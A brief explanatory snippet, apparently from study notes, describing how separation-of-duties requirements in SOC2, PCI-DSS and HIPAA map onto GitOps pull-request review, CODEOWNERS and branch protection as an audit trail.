**Tricky**: Many compliance frameworks (SOC2, PCI-DSS, HIPAA) require "separation of duties" — the person who writes code cannot be the person who approves deployment. In GitOps, this maps to: PR author ≠ PR reviewer ≠ person who merges. GitHub's CODEOWNERS + branch protection + required reviews naturally enforce this. The key insight: if your Git workflow already requires PR reviews, you ALREADY have an audit trail. The compliance tool just needs to formalize it into change records.

---
